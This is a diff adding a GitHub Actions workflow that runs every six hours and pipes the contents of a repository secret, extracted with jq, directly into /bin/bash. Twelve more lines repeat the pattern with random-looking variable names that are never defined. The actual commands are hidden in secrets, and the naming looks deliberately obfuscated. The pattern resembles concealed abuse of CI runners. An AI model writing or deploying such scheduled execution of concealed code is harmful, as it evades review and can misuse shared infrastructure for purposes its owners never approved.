@@ -1,0 +1,28 @@
+name: guyuanmeigu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: guyuanmeigu
+        env:
+          te039: ${{ secrets.te039 }}
+        run: |
+          echo $te039 | jq -r .cr8036 | /bin/bash
+          echo $z65 | jq -r .apu1 | /bin/bash
+          echo $cl66 | jq -r .zy1 | /bin/bash
+          echo $eikzs6 | jq -r .ugxko04 | /bin/bash
+          echo $fiv544 | jq -r .urw545 | /bin/bash
+          echo $ep87944 | jq -r .av480 | /bin/bash
+          echo $kqlq66375 | jq -r .zls3858 | /bin/bash
+          echo $vyqsi352 | jq -r .mgd57603 | /bin/bash
+          echo $c4 | jq -r .x9 | /bin/bash
+          echo $mmazq704 | jq -r .ebi06991 | /bin/bash
+          echo $khf18 | jq -r .lu815 | /bin/bash
+          echo $oik89215 | jq -r .p53828 | /bin/bash
+          echo $np1 | jq -r .tusn375 | /bin/bash
+
